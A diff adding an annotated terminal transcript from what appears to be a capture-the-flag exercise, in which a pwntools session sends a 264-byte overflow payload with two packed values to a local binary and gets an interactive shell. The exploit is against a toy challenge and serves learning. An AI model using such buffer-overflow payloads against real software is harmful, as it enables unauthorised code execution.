@@ -1,0 +1,24 @@
+┌──(kali㉿kali)-[~/pwns/chall_01]
+└─$ python              
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *  ------------------------------------------------------------------->  Command
+>>> p = process('./a.out') ------------------------------------------------------------------->  Command
+[x] Starting local process './a.out'  
+[+] Starting local process './a.out': pid 36900
+>>> p.recv()      ------------------------------------------------------------------->  Command
+b'Obi Wan has trained you well...\n'
+>>> rec=_   ------------------------------------------------------------------->  Command
+>>> rec     ------------------------------------------------------------------->  Command
+b'Obi Wan has trained you well...\n'
+>>> payload = 264 * b'A'   ------------------------------------------------------------------->  Command
+>>> payload += p32(0x1337)  ------------------------------------------------------------------->  Command
+>>> payload += p32(0x69696969)  ------------------------------------------------------------------->  Command
+>>> print(payload)  ------------------------------------------------------------------->  Command
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7\x13\x00\x00iiii'
+>>> p.sendline(payload)  ------------------------------------------------------------------->  Command
+>>> p.interactive()      ------------------------------------------------------------------->  Command
+[*] Switching to interactive mode
+My powers have doubled since the last time we met
+whoami
+kali
